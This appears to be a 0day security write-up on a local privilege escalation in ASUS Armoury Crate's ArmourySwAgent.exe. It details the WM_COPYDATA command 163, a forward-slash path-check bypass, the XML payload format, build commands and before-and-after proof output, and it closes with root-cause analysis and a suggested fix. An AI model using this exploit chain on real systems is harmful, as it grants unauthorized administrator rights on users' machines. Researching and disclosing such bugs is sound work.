# 0DAY: ArmourySwAgent WM_COPYDATA Arbitrary Process Execution (Medium → High IL)

**Product**: ASUS Armoury Crate (ArmourySwAgent.exe)  
**Confirmed**: Windows 11 Build 26200, Armoury Crate ≤ 6.x  
**Class**: Logic bug — UAC bypass / Local Privilege Escalation  
**Impact**: Medium Integrity Level → High Mandatory Level (S-1-16-12288, full elevated admin token)  
**Requires**: Armoury Crate installed; payload path writable by standard users  
**Authentication**: None (same desktop session, no admin password)

---

## Summary

ArmourySwAgent.exe is a 32-bit .NET process that runs at **High Integrity Level** (requireAdministrator manifest). It creates a hidden message window and explicitly allows Medium-IL processes to send `WM_COPYDATA` via `ChangeWindowMessageFilter(WM_COPYDATA, MSGFLT_ALLOW)`. A Medium-IL attacker can send a crafted `WM_COPYDATA` message with command ID 163 (LaunchProgram) and an XML payload containing an absolute path using **forward slashes** to trigger arbitrary process execution at High IL.

---

## Vulnerability Chain

### Step 1: UIPI bypass (ChangeWindowMessageFilter)

ArmourySwAgent registers a custom window class (`ArmourySwAgentClass`, window name `ArmourySwAgentName`) and explicitly lowers the UIPI filter for WM_COPYDATA:

```csharp
ChangeWindowMessageFilter(WM_COPYDATA, MSGFLT_ALLOW);  // allows Medium IL → High IL
```

This is intentional (designed for cross-process IPC with Armoury Crate UI), but creates an attack surface.

### Step 2: Command dispatch (wrong command ID)

The `ReceiveProc` switch table (indexed by `dwData - 0xa1`):

| dwData | Command        | Handler                                  |
|--------|----------------|------------------------------------------|
| 161    | GamingMode     | ParseGamingModeXml + File.WriteAllText   |
| 162    | Fan            | ParseFanXml + Fan.Execute                |
| **163**| **LaunchProgram**| **ParseLaunchXml + LaunchPath → Process.Start** |
| 164    | KeyChange      | ...                                      |

The exploit uses **dwData = 163**.

### Step 3: String null-terminator fix (cbData = bytes + 2)

The COPYDATASTRUCT is declared with `lpData` as `string` (CharSet.Unicode), marshaled via `Marshal.PtrToStringUni(ptr)` (null-terminated). The Windows shared-memory section is exactly `cbData` bytes; bytes past this boundary in the target's address space contain heap garbage. 

Fix: send `cbData = xmlBytes.Length + 2` so the `\0\0` null is included in the shared section, giving `PtrToStringUni` a clean terminator. Without this, `XmlDocument.LoadXml` throws on trailing garbage characters.

### Step 4: Path check bypass (forward slashes)

`LaunchPath(string strPath)` branches on:

```csharp
if (strPath.Contains(":\\")) {
    // Explorer.exe branch — uses existing MEDIUM IL shell instance → no elevation
    Process.Start(new ProcessStartInfo {
        FileName    = "explorer.exe",
        Arguments   = strPath,
        UseShellExecute = true
    });
} else {
    // ELSE branch — direct ShellExecuteEx → child inherits HIGH IL token
    Process.Start(new ProcessStartInfo {
        FileName        = strPath,
        UseShellExecute = true
    });
}
```

**Bypass**: Use forward slashes in the path. `"C:/ProgramData/ASUS/lpe_proof.bat"` does not contain `":\\"` (has `"C:/"` not `"C:\"`), so it takes the **ELSE branch**. Windows APIs normalize forward slashes to backslashes transparently, so `ShellExecuteEx` resolves the file correctly. The spawned `cmd.exe` inherits ArmourySwAgent's **High IL token**.

---

## Exploit Flow

```
Attacker (Medium IL)                  ArmourySwAgent (High IL)
─────────────────────                 ────────────────────────────────────
1. Write payload to                   
   C:\ProgramData\ASUS\payload.bat    
   (writable by BUILTIN\Users)        

2. FindWindow("ArmourySwAgentClass")  

3. SendMessage(hwnd, WM_COPYDATA,     4. ReceiveProc: WM_COPYDATA received
      dwData=163,                        PtrToStructure → cds.dwData=163
      cbData=xmlBytes+2,               5. switch(163-161=2): LaunchProgram
      lpData→XML)  ─────────────────► 6. ParseLaunchXml(strData)
                                         XmlDocument.LoadXml(clean XML) ✓
                                         LAUNCH_PATH = "C:/ProgramData/..."
                                      7. ThreadProc → LaunchPath(path)
                                         path.Contains(":\\") = FALSE
                                         → ELSE branch
                                         Process.Start(FileName="C:/...")
                                         ShellExecuteEx → cmd.exe [HIGH IL]
                                      8. cmd.exe runs payload.bat at HIGH IL
```

---

## Proof of Exploitation

**Before** (Medium IL whoami /groups):
```
BUILTIN\Administrators    Group used for deny only
Mandatory Label\Medium Mandatory Level    S-1-16-8192
```

**After** (payload.bat executed via ArmourySwAgent):
```
BUILTIN\Administrators    Mandatory group, Enabled by default, Enabled group, Group owner
Mandatory Label\High Mandatory Level    S-1-16-12288
```

---

## Exploit Code

File: `lpe_swagent.cs`

Key parameters:
- Window class: `ArmourySwAgentClass` / name: `ArmourySwAgentName`
- `dwData = 163` (0xa3)
- `cbData = Encoding.Unicode.GetBytes(xml).Length + 2`
- XML: `<root><launch_program><link>C:/path/to/payload.bat</link></launch_program></root>`
- Path must use forward slashes to bypass the `":\\"` check

Build:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -nologo -platform:x86 -out:lpe_swagent.exe lpe_swagent.cs
```

---

## Root Cause

Two logic bugs combine to produce the LPE:

1. **Unrestricted cross-IL IPC**: `ChangeWindowMessageFilter(WM_COPYDATA, MSGFLT_ALLOW)` is too broad — any process at any IL can send arbitrary commands to the High IL dispatcher.

2. **Insufficient path validation**: `LaunchPath` attempts to use `explorer.exe` as a de-elevation proxy for absolute paths (`":\\"` check), but the check is bypassable by using forward slashes. The fix should be: validate the path format with `Path.IsPathRooted()` (which handles both separators) and disallow execution of user-writable paths from a High IL service.

---

## Affected Versions

Confirmed: ASUS Armoury Crate ≤ 6.x with ArmourySwAgent.exe dated 2026-03-09  
Likely affected: all Armoury Crate versions prior to a targeted fix

---

## Timeline

- 2026-06-16: Discovered and exploited on Windows 11 Build 26200
